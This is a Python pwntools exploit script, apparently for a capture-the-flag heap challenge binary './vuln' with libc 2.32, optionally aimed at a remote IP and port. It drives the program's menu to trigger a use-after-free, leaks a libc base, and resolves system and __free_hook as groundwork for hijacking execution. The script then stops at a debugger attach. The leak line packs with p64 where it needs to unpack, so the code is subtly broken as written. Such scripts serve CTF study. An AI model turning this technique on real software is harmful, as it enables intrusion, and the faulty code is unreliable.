from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "182.148.156.200"
    r = connect(host,9135)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass



libc = ELF('./libc-2.32.so')
elf = ELF('./vuln')

def add(page , size):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'Index: ', str(page).encode())
    r.sendlineafter(b'Size: ', str(size).encode())

def delete(page):
    r.sendlineafter(b'>',b'2')
    r.sendlineafter(b'Index: ', str(page).encode())

def edit(page , content):
    r.sendlineafter(b'>',b'3')
    r.sendlineafter(b'Index: ', str(page).encode())
    r.sendafter(b'Content: ' , content)

def show(page):
    r.sendlineafter(b'>',b'4')
    r.sendlineafter(b'Index: ', str(page).encode())

add(0,0x500)
add(1,0x500)
delete(0)
edit(0,b'a')
show(0)
libc_addr = p64(r.recv(6).ljust(8,b'\x00')) -0x61 -0x1e3c00
info('libc:'+hex(libc_addr))
libc.address = libc_addr
system_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
info('system_addr:'+hex(system_addr))
info('free_hook :'+hex(free_hook))


gdb.attach(r)
pause()
# r.sendlineafter()
# r.send()
# r.recvuntil()
r.interactive()
